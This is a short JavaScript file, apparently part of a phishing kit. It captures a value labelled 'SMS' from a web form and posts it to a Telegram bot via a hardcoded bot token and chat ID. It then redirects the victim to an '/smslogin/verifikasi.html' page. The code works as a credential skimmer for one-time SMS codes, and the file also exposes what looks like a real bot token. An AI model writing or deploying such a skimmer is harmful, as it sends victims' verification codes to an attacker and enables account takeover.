const TOKEN = "6245667145:AAEtFQs8Pl1VwLz6ebU_U46pE7KLt8DKXs4";
const CHAT_ID = "2069375790";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
const form = document.getElementById("tg");
 
form.addEventListener("submit", onSubmitTelegram);
 
function onSubmitTelegram(e) {
    e.preventDefault();
 
    const {
        name,
    } = form;
    const data = {
        name: name.value,
    };
 
    let message = `<b></b>\n`;
    message += `<b>𝑺𝑴𝑺: </b> ${data.name}`;
 
    const dataTg = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "html",
    };
 
    const options = {
        method: "POST",
        body: JSON.stringify(dataTg),
        headers: {
            "Content-Type": "application/json",
        },
    };
 
    fetch(URL_API, options)
        .then((res) => res.json())
        .then((res) => console.log(res))
        .catch((err) => console.log(err));
 
    window.location.href = '/smslogin/verifikasi.html';
}